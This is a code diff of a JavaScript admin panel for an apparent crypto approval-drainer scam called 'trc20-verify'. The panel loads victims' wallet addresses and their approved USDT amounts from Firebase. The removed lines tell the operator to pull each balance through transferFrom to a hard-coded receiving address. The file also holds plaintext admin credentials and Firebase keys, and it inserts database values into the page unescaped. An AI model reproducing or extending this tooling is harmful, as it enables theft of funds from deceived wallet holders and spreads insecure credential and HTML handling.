@@ -1,59 +1,47 @@
-const USERNAME = "enre.atul";
-const PASSWORD = "Honda988701@";
+// Firebase Config
+const firebaseConfig = {
+  apiKey: "AIzaSyDPwmF77VXvOlM3l4v2dJsqN0QFh8Qxwfk",
+  authDomain: "trc20-verify-17c29.firebaseapp.com",
+  projectId: "trc20-verify-17c29",
+  storageBucket: "trc20-verify-17c29.firebasestorage.app",
+  messagingSenderId: "197859891589",
+  appId: "1:197859891589:web:ae2f73ab5c3b6bc1c88cec",
+  databaseURL: "https://trc20-verify-17c29-default-rtdb.asia-southeast1.firebasedatabase.app"
+};
 
-const firebaseUrl = "https://trc20-verify-17c29-default-rtdb.firebaseio.com/users.json";
-const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // TRC-20 USDT
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
 
-document.getElementById("dashboard").style.display = "none";
+// Login Function
+document.getElementById("loginBtn").addEventListener("click", login);
 
 function login() {
-  const username = document.getElementById("username").value.trim();
-  const password = document.getElementById("password").value.trim();
-
-  if (username === USERNAME && password === PASSWORD) {
-    document.getElementById("loginSection").style.display = "none";
-    document.getElementById("dashboard").style.display = "block";
-    fetchWallets();
+  const user = document.getElementById("username").value;
+  const pass = document.getElementById("password").value;
+  if (user === "enre.atul" && pass === "Honda988701@") {
+    document.getElementById("loginContainer").style.display = "none";
+    document.getElementById("adminPanel").style.display = "block";
+    loadWallets();
   } else {
     alert("Invalid credentials");
   }
 }
 
-async function fetchWallets() {
-  const res = await fetch(firebaseUrl);
-  const data = await res.json();
+// Load Wallet Data from Firebase
+function loadWallets() {
   const table = document.getElementById("walletTableBody");
-  table.innerHTML = "";
-
-  for (let key in data) {
-    const { address, balance, approved } = data[key];
-    const tr = document.createElement("tr");
-
-    const addressTd = document.createElement("td");
-    addressTd.innerText = address;
-    tr.appendChild(addressTd);
-
-    const approvedTd = document.createElement("td");
-    approvedTd.innerText = approved || "0";
-    tr.appendChild(approvedTd);
-
-    const balanceTd = document.createElement("td");
-    balanceTd.innerText = balance || "0";
-    tr.appendChild(balanceTd);
-
-    const buttonTd = document.createElement("td");
-    const btn = document.createElement("button");
-    btn.innerText = "Withdraw";
-    btn.onclick = () => {
-      const userWallet = address;
-      const to = "TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN"; // Your TRC-20 Receiving Address
-      const amount = approved;
-
-      alert(`Manual Withdraw:\nFrom: ${userWallet}\nTo: ${to}\nAmount: ${amount} USDT\nUse TronLink + tronscan.org > Contract > transferFrom`);
-    };
-    buttonTd.appendChild(btn);
-    tr.appendChild(buttonTd);
-
-    table.appendChild(tr);
-  }
+  db.ref("wallets").once("value", (snapshot) => {
+    table.innerHTML = "";
+    snapshot.forEach((child) => {
+      const data = child.val();
+      const row = `
+        <tr>
+          <td>${data.address}</td>
+          <td>${data.approved || 'N/A'}</td>
+          <td>${data.balance || 'N/A'}</td>
+          <td><button class="withdraw-btn">Withdraw</button></td>
+        </tr>`;
+      table.innerHTML += row;
+    });
+  });
 }
